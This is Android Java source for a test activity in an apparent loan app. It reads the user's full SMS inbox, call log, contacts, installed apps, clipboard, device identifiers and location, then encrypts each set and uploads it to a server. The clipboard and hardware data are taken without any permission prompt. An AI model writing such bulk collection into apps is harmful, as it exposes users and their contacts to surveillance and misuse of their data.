package com.myLoan.br.activity;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.pm.PackageManager;
import android.location.LocationListener;
import android.os.Build;
import android.os.Handler;
import androidx.core.app.ActivityCompat;
import android.util.Log;

import com.google.gson.Gson;
import com.myLoan.br.MyApplication;
import com.myLoan.br.R;
import com.myLoan.br.base.BaseActivity;
import com.myLoan.br.base.BasePresenter;
import com.myLoan.br.bean.UserDeviceDetailVO;
import com.myLoan.br.bean.UserPhoneAddCodeBO;
import com.myLoan.br.bean.UserPhoneCallDTO;
import com.myLoan.br.bean.PackInfoBean;
import com.myLoan.br.bean.UserPhoneSmsDTO;
import com.myLoan.br.bean.UserPhoneAppDTOS;
import com.myLoan.br.bean.UserPhoneBO;
import com.myLoan.br.bean.UserPhoneContactDTO;
import com.myLoan.br.bean.UserPhoneContactDTOS;
import com.myLoan.br.listener.contract.DeviceView;
import com.myLoan.br.tools.map.MyLocation;
import com.myLoan.br.tools.loginstate.LoginContext;
import com.myLoan.br.tools.loginstate.LoginState;
import com.myLoan.br.presenter.DevicePresenter;
import com.myLoan.br.tools.phonestatus.ContactUtil;
import com.myLoan.br.tools.math.DESCoder;
import com.myLoan.br.tools.DebugLog;
import com.myLoan.br.tools.view.DensityUtil;
import com.myLoan.br.tools.phonestatus.DeviceUtil;
import com.myLoan.br.tools.phonestatus.LocationUtil;
import com.myLoan.br.tools.phonestatus.NetWorkUtil;
import com.myLoan.br.tools.phonestatus.PackageManagerUtil;
import com.myLoan.br.tools.RootManager;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import io.reactivex.functions.Consumer;

/**
 * @author wzx
 * @version 3.0.0 2018/12/10 16:25
 * @update wzx 2018/12/10 16:25
 * @updateDes
 * @include {@link }
 * @used {@link }
 */
public class TestPhoneActivity extends BaseActivity implements DeviceView {

    private DevicePresenter mDevicePresenter;
    private HashMap<String, String> map = new HashMap<String, String>();

    UserDeviceDetailVO userDeviceDetailVO = new UserDeviceDetailVO();

    @Override
    public int getLayoutId() {
        return R.layout.activity_test;
    }

    @Override
    public void initListener() {
        //开启位置监听
//        AlxLocationManager.onCreateGPS(MyApplication.mContext);
    }

    @Override
    public void initView() {

    }

    @Override
    public void intData() {
//        initInstalledApp(); //ok
//        initContact();//ok
//        initCall();//ok
        initSms();//ok
//        initPhone();
        initDviceDetail();//ok
//        initNewCode();
////        ActivityCompat.requestPermissions(this,
////                new String[]{Manifest.permission.READ_CONTACTS,Manifest.permission.READ_CALL_LOG}, 101);
//        initMessAndCallCount();

    }

    private String smsCount;
    private String callCount;

    private boolean oneCountPermissionOK;
    private boolean twoCountPermissionOk;
    private boolean threeCountPermissionOk;

    private void initMessAndCallCount() {
//        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
        RxPermissions rePermissions = new RxPermissions(this);
        rePermissions
                .request(Manifest.permission.READ_CALL_LOG)
                .subscribe(new Consumer<Boolean>() {
                    @Override
                    public void accept(Boolean aBoolean) throws Exception {
                        if (aBoolean) {
                            Log.d("initMessAndCallCount", "1111");
                            oneCountPermissionOK = true;
                            setCount();
                        } else {
                            Log.d("initMessAndCallCount", "2222");
                            setCount();
                        }
                    }
                });

        rePermissions
                .request(Manifest.permission.READ_CONTACTS)
                .subscribe(new Consumer<Boolean>() {
                    @Override
                    public void accept(Boolean aBoolean) throws Exception {
                        if (aBoolean) {
                            Log.d("initMessAndCallCount", "555");
                            threeCountPermissionOk = true;
                            setCount();
                        } else {
                            Log.d("initMessAndCallCount", "666");
                            setCount();
                        }
                    }
                });

//        } else {
//
//        }


//        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
        RxPermissions rePermissions1 = new RxPermissions(this);
        rePermissions1
                .request(Manifest.permission.READ_SMS)
                .subscribe(new Consumer<Boolean>() {
                    @Override
                    public void accept(Boolean aBoolean) throws Exception {
                        if (aBoolean) {
                            Log.d("initMessAndCallCount", "3333");
                            twoCountPermissionOk = true;
                            setCount();
                        } else {
                            Log.d("initMessAndCallCount", "4444");
                        }

                    }
                });

//        } else {
//            twoCountPermissionOk = true;
//            setCount();
//
//        }


    }


    private void setCount() {
        if (oneCountPermissionOK && twoCountPermissionOk && threeCountPermissionOk) {
            mDevicePresenter.getMessAndCallCount(
                    ContactUtil.readSmsSize(mContext) + "",
                    ContactUtil.getCallLogSize(mContext) + "");
        }
    }

    private void initNewCode() {
        //获取第一条通话记录

        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_CALL_LOG).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    onePermissionOK = true;
                    sendInfo();
                }
            });

        } else {
            onePermissionOK = true;
            sendInfo();
        }

        //读取第一条短信

        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_SMS).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    twoPermissionOk = true;
                    sendInfo();
                }
            });

        } else {
            twoPermissionOk = true;
            sendInfo();

        }
    }

    boolean onePermissionOK;
    boolean twoPermissionOk;

    private void sendInfo() {
        if (onePermissionOK && twoPermissionOk) {
            UserPhoneSmsDTO.UserPhoneSmsBO sms = ContactUtil.readFirstSms(mContext);
            String earliestSms = sms.getSmsTime();
            UserPhoneCallDTO.UserPhoneCallBO callBO = ContactUtil.readFirstReadCallLog(mContext);
            String earliestCall = callBO.getCallStartTime();
            String clipStr = DeviceUtil.getClip(mContext);
            UserPhoneAddCodeBO userPhoneAddCodeBO = new UserPhoneAddCodeBO();
            userPhoneAddCodeBO.setClipboard(clipStr);
            userPhoneAddCodeBO.setEarliestCall(earliestCall);
            userPhoneAddCodeBO.setEarliestSms(earliestSms);
            Gson gson = new Gson();
            String entry = DESCoder.encryData(gson.toJson(userPhoneAddCodeBO));
            mDevicePresenter.getNewCode(entry);
        }

    }


    private void initDviceDetail() {
        userDeviceDetailVO.setBoard(Build.BOARD);
        userDeviceDetailVO.setBrand(Build.BRAND);
        userDeviceDetailVO.setBuildId(Build.ID);
        userDeviceDetailVO.setCpuAbi(Build.CPU_ABI);
        userDeviceDetailVO.setDevice(Build.DEVICE);
        userDeviceDetailVO.setDisplay(Build.DISPLAY);
        userDeviceDetailVO.setHost(Build.HOST);
        userDeviceDetailVO.setManufacturer(Build.MANUFACTURER);
        userDeviceDetailVO.setModel(Build.MODEL);
        userDeviceDetailVO.setMwlanmac(DeviceUtil.getWIFIMAC());
        userDeviceDetailVO.setProduct(Build.PRODUCT);
        userDeviceDetailVO.setTags(Build.TAGS);
        userDeviceDetailVO.setType(Build.TYPE);
        userDeviceDetailVO.setUser(Build.USER);


        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_PHONE_STATE).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    if (aBoolean) {
                        userDeviceDetailVO.setImei(DeviceUtil.getIMEI());//权限
                        Gson gson = new Gson();
                        mDevicePresenter.getDeviceDetail(userDeviceDetailVO);
                    } else {
                        //只要有一个权限被拒绝，就会执行
//                        userDeviceDetailVO.setImei(DeviceUtil.getIMEI());//权限
                    }
                }
            });

        } else {
            userDeviceDetailVO.setImei(DeviceUtil.getIMEI());//权限
            Gson gson = new Gson();
            mDevicePresenter.getDeviceDetail(userDeviceDetailVO);
        }
    }

    private void initPhone() {
        getLocation();
        //保存手机硬件信息
        UserPhoneBO userPhoneBO = new UserPhoneBO();
        UserPhoneBO.UserPhoneAddressBO userPhoneAddressBO = new UserPhoneBO.UserPhoneAddressBO();
        UserPhoneBO.UserPhoneBssidBO userPhoneBssidBO = new UserPhoneBO.UserPhoneBssidBO();
        final UserPhoneBO.UserPhoneHardwareBO userPhoneHardwareBO = new UserPhoneBO.UserPhoneHardwareBO();
        UserPhoneBO.UserPhoneIpBO userPhoneIpBO = new UserPhoneBO.UserPhoneIpBO();
        UserPhoneBO.UserPhoneVersionBO userPhoneVersionBO = new UserPhoneBO.UserPhoneVersionBO();

        //ssid
        userPhoneBssidBO.setBssid(DeviceUtil.Wifi.getBSSID(mContext));

        //* 用户手机信息
        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_PHONE_STATE).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    if (aBoolean) {
                        //申请的权限全部允许,定位请求
                        setUserPhoneHardwareBO(userPhoneHardwareBO);
                    } else {
                        //只要有一个权限被拒绝，就会执行
                        setUserPhoneHardwareBO(userPhoneHardwareBO);
                    }
                }
            });

        } else {
            setUserPhoneHardwareBO(userPhoneHardwareBO);
        }

        //用户手机ip信息
        userPhoneIpBO.setMacAddress(DeviceUtil.Wifi.getWifiMac1());
        HashMap<String, String> map = NetWorkUtil.getIp(mContext);
        if (map != null) {
            userPhoneIpBO.setIpAddress(map.get("ip"));
            userPhoneIpBO.setIpAddressAttribute(map.get("ipType"));
        }

        TimeZone tz = TimeZone.getDefault();
        String strTz = tz.getDisplayName(false, TimeZone.SHORT);
        //用户手机版本信息
        userPhoneVersionBO.setDownloadChannel("google");

        userPhoneVersionBO.setAppErsion(PackageManagerUtil.getVersionName());
        userPhoneVersionBO.setTimeZone(strTz);

        userPhoneBO.setUserPhoneAddressBO(userPhoneAddressBO);
        userPhoneBO.setUserPhoneBssidBO(userPhoneBssidBO);
        userPhoneBO.setUserPhoneHardwareBO(userPhoneHardwareBO);
        userPhoneBO.setUserPhoneIpBO(userPhoneIpBO);
        userPhoneBO.setUserPhoneVersionBO(userPhoneVersionBO);

        DebugLog.i("wang", "====click====longitude=" + MyLocation.getInstance().longitude + "===latitude===" + MyLocation.getInstance().latitude);
        userPhoneAddressBO.setLongitude(MyLocation.getInstance().longitude + "");
        userPhoneAddressBO.setLatitude(MyLocation.getInstance().latitude + "");

        Gson gson1 = new Gson();
        String entry = DESCoder.encryData(gson1.toJson(userPhoneBO));
        mDevicePresenter.hardWareMess(entry);


//        if (Build.VERSION.SDK_INT >= 23) {
//            checkAndRequestPermission();
//        } else {
//            // 如果是Android6.0以下的机器，默认在安装时获得了所有权限
//            getLocation();
//        }
    }

    private void initCall() {
        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_CALL_LOG).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    if (aBoolean) {
                        //申请的权限全部允许,定位请求
                        List<UserPhoneCallDTO.UserPhoneCallBO> listBeanList = ContactUtil.readCallLog(mContext);
//                        mDevicePresenter.getContact();
                        UserPhoneCallDTO userPhoneCallDTO = new UserPhoneCallDTO();
                        userPhoneCallDTO.setList(listBeanList);
                        Gson gson = new Gson();
                        String entry = DESCoder.encryData(gson.toJson(userPhoneCallDTO));
                        mDevicePresenter.getCall(entry);
                    } else {
                        //只要有一个权限被拒绝，就会执行
                    }
                }
            });
        } else {
            List<UserPhoneCallDTO.UserPhoneCallBO> listBeanList = ContactUtil.readCallLog(mContext);
            UserPhoneCallDTO userPhoneCallDTO = new UserPhoneCallDTO();
            userPhoneCallDTO.setList(listBeanList);
            String userId = "";
            if (LoginContext.getLoginContext().getState() instanceof LoginState
                    && LoginContext.getLoginContext().getUser(MyApplication.mContext) != null) {
                userId = LoginContext.getLoginContext().getUser(MyApplication.mContext).getId() + "";
            }
            userPhoneCallDTO.setUserId(userId);
            Gson gson = new Gson();
            String entry = DESCoder.encryData(gson.toJson(userPhoneCallDTO));
            mDevicePresenter.getCall(entry);
        }
    }

    private void initSms() {
        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_SMS).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    if (aBoolean) {
                        //申请的权限全部允许,定位请求
                        List<UserPhoneSmsDTO.UserPhoneSmsBO> listSms = ContactUtil.readSms(mContext);
                        UserPhoneSmsDTO userPhoneSmsDTO = new UserPhoneSmsDTO();
                        userPhoneSmsDTO.setList(listSms);
                        Gson gson = new Gson();
                        String entry = DESCoder.encryData(gson.toJson(userPhoneSmsDTO));
                        mDevicePresenter.getSms(entry);
                    } else {
                        //只要有一个权限被拒绝，就会执行
                    }
                }
            });
        } else {
            List<UserPhoneSmsDTO.UserPhoneSmsBO> listSms = ContactUtil.readSms(mContext);
            UserPhoneSmsDTO userPhoneSmsDTO = new UserPhoneSmsDTO();
            userPhoneSmsDTO.setList(listSms);
            String userId = "";
            if (LoginContext.getLoginContext().getState() instanceof LoginState
                    && LoginContext.getLoginContext().getUser(MyApplication.mContext) != null) {
                userId = LoginContext.getLoginContext().getUser(MyApplication.mContext).getId() + "";
            }
            userPhoneSmsDTO.setUserId(userId);
            Gson gson = new Gson();
            String entry = DESCoder.encryData(gson.toJson(userPhoneSmsDTO));
            mDevicePresenter.getSms(entry);

        }
    }

    private void initContact() {
        if (ActivityCompat.checkSelfPermission(MyApplication.mContext, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            RxPermissions rePermissions = new RxPermissions(this);
            rePermissions.request(Manifest.permission.READ_CONTACTS).subscribe(new Consumer<Boolean>() {
                @Override
                public void accept(Boolean aBoolean) throws Exception {
                    if (aBoolean) {
                        //申请的权限全部允许,定位请求
                        List<UserPhoneContactDTO> listContact = ContactUtil.readContactMessage(mContext);
                        UserPhoneContactDTOS userPhoneContactDTOS = new UserPhoneContactDTOS();
                        userPhoneContactDTOS.setList(listContact);
                        Gson gson = new Gson();
                        String entry = DESCoder.encryData(gson.toJson(userPhoneContactDTOS));
                        mDevicePresenter.getContact(entry);
                    } else {
                        //只要有一个权限被拒绝，就会执行
                    }
                }
            });
        } else {
            List<UserPhoneContactDTO> listContact = ContactUtil.readContactMessage(mContext);
            UserPhoneContactDTOS userPhoneContactDTOS = new UserPhoneContactDTOS();
            userPhoneContactDTOS.setList(listContact);
            Gson gson = new Gson();
            String entry = DESCoder.encryData(gson.toJson(userPhoneContactDTOS));
            mDevicePresenter.getContact(entry);
        }
    }


    private void initInstalledApp() {
        //安装过的app信息
        List<PackInfoBean> packInfoList = PackageManagerUtil.getAppPackageInfo(mContext, true);
        UserPhoneAppDTOS userPhoneAppDTOS = new UserPhoneAppDTOS();
        userPhoneAppDTOS.setList(packInfoList);
        Gson gson = new Gson();
//        DebugLog.i("wang", "==list==" + gson.toJson(userPhoneAppDTOS));
        String entry = DESCoder.encryData(gson.toJson(userPhoneAppDTOS));
//        DebugLog.i("wang", "==list==entry  " + entry);
        mDevicePresenter.getInstalledApkMess(entry);
    }

    private void setUserPhoneHardwareBO(UserPhoneBO.UserPhoneHardwareBO userPhoneHardwareBO) {
        userPhoneHardwareBO.setPhoneIccd(DeviceUtil.getICCID(mContext));
        userPhoneHardwareBO.setPhoneImei(DeviceUtil.getIMEI());
        userPhoneHardwareBO.setPhoneImsi(DeviceUtil.getIMSI(mContext));
        userPhoneHardwareBO.setPhoneUuid(DeviceUtil.getUUID(mContext));

        userPhoneHardwareBO.setPhoneNumber(DeviceUtil.getTelPhone(mContext));
        userPhoneHardwareBO.setPhoneMeid(DeviceUtil.getMEID());
        userPhoneHardwareBO.setEquipmentModel(DeviceUtil.getDeviceName());
        userPhoneHardwareBO.setCpu(DeviceUtil.getAndroidCpuApi());
        userPhoneHardwareBO.setSystemVersion(android.os.Build.VERSION.SDK);
        userPhoneHardwareBO.setMotherboard(DeviceUtil.getAndroidBorder());
        userPhoneHardwareBO.setRoot(RootManager.isDeviceRooted());
        userPhoneHardwareBO.setBootTime(DeviceUtil.getOpenTime() + "");
        userPhoneHardwareBO.setBatteryPower(DeviceUtil.getBatteryLevel(mContext) + "");
        userPhoneHardwareBO.setScreenSize(DeviceUtil.getSize(mContext) + "");
        userPhoneHardwareBO.setScreenResolutionDpi(DensityUtil.getDensity(mContext) + "");
        userPhoneHardwareBO.setScreenResolution(DensityUtil.getDisplayWidth(mContext) + "*" + DensityUtil.getDisplayHeight(mContext));
        userPhoneHardwareBO.setAffiliatedTerminal("3");
    }


    @Override
    protected BasePresenter[] oncreatePresenter() {
        mDevicePresenter = new DevicePresenter();
        BasePresenter[] presenters = {mDevicePresenter};
        return presenters;
    }

    @TargetApi(Build.VERSION_CODES.M)
    private void checkAndRequestPermission() {
        List<String> lackedPermission = new ArrayList<String>();
        if (checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            lackedPermission.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }

        if (!(checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED)) {
            lackedPermission.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }


        // 权限都已经有了，直接获取定位
        if (lackedPermission.size() == 0) {
            getLocation();
        } else {
            // 请求所缺少的权限，在onRequestPermissionsResult中再看是否获得权限，如果获得权限就可以调用SDK，否则不要调用SDK。
            String[] requestPermissions = new String[lackedPermission.size()];
            lackedPermission.toArray(requestPermissions);
            iniPermissin(requestPermissions);
        }
    }


    private void iniPermissin(String[] permissions) {
        RxPermissions rePermissions = new RxPermissions(this);
        rePermissions.request(permissions).subscribe(new Consumer<Boolean>() {
            @Override
            public void accept(Boolean aBoolean) throws Exception {
                if (aBoolean) {
                    //申请的权限全部允许,定位请求
                    getLocation();

                } else {
                    //只要有一个权限被拒绝，就会执行
                    sendLocation("0", "0");
                }
            }

        });

    }

    private boolean isRun = true;
    private int time;
//    isRun = true;

    private LocationListener locationListener;

    private void getLocation() {
        if (LocationUtil.isGPSOPen(mContext)) {
            getLocationByAndroid();
        } else {
            getLocationByAx();
        }
    }

    private void getLocationByAndroid() {
        if (locationListener == null) {
//            locationListener = new LocationUtil.MyLocation(mContext);
        }
        LocationUtil.getLngAndLat(mContext, locationListener);
        int latitude = (int) MyLocation.getInstance().latitude;
        int longitude = (int) MyLocation.getInstance().longitude;
        DebugLog.d("wzx", String.valueOf(latitude + " getLocationByAndroid " + longitude));
        if (latitude == 0 || longitude == 0) {
            getLocationByAx();
        } else {
            sendLocation(latitude + "", longitude + "");
        }
    }

    private void getLocationByAx() {
        final Handler handler = new Handler();
        time = 0;

        //每隔2s更新一下经纬度结果
        new Timer().scheduleAtFixedRate(new TimerTask() {//每秒钟检查一下当前位置
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        if (isRun) {
                            int latitude = (int) MyLocation.getInstance().latitude;
                            int longitude = (int) MyLocation.getInstance().longitude;
                            DebugLog.d("wzx", String.valueOf(MyLocation.getInstance().latitude) + " getLocationByAx111 " + String.valueOf(MyLocation.getInstance().longitude));
                            time++;
                            if (latitude != 0 && longitude != 0) {
//                                HashMap<String, String> map = new HashMap<String, String>();
                                DebugLog.d("wzx", String.valueOf(MyLocation.getInstance().latitude) + " getLocationByAx222 " + String.valueOf(MyLocation.getInstance().longitude));
                                isRun = false;
                                sendLocation(latitude + "", longitude + "");
                                return;
                            } else {
                                if (time >= 30) {
//                                    HashMap<String, String> map = new HashMap<String, String>();
//                                    callbackContext.success(new Gson().toJson(map));
                                    sendLocation("0", "0");
                                    isRun = false;

                                    return;
                                }
                            }
                        }

                    }
                });
            }
        }, 0, 1500);
    }

    private void sendLocation(String latitude, String longitude) {
        UserPhoneBO userPhoneBO = new UserPhoneBO();
        UserPhoneBO.UserPhoneAddressBO userPhoneAddressBO = new UserPhoneBO.UserPhoneAddressBO();
        userPhoneAddressBO.setLatitude(latitude + "");
        userPhoneAddressBO.setLongitude(longitude + "");
        userPhoneBO.setUserPhoneAddressBO(userPhoneAddressBO);
        Gson gson = new Gson();
        mDevicePresenter.hardWareMess(gson.toJson(userPhoneBO));
    }

    @Override
    public void getInatalledApkSuccess() {

    }

    @Override
    public void getInatalledApkFail(int code, String message) {

    }

    @Override
    public void getContactSuccess() {

    }

    @Override
    public void getContactFail(int code, String message) {

    }

    @Override
    public void getCallSuccess() {

    }

    @Override
    public void getCallFail(int code, String message) {

    }

    @Override
    public void getSmsSuccess() {

    }

    @Override
    public void getSmsFail(int code, String message) {

    }

    @Override
    public void getDeviceDetailSuccess() {

    }

    @Override
    public void getDeviceDetailFail(int code, String message) {

    }

    @Override
    public void getNewCodeSuccess() {

    }

    @Override
    public void getNewCodeFail(int code, String message) {

    }

    @Override
    public void getCountSuccess() {

    }

    @Override
    public void getCountFail(int code, String message) {

    }

    @Override
    public void getHardWareMessSuccess() {

    }

    @Override
    public void getHardWareMessFail(int code, String message) {

    }
}
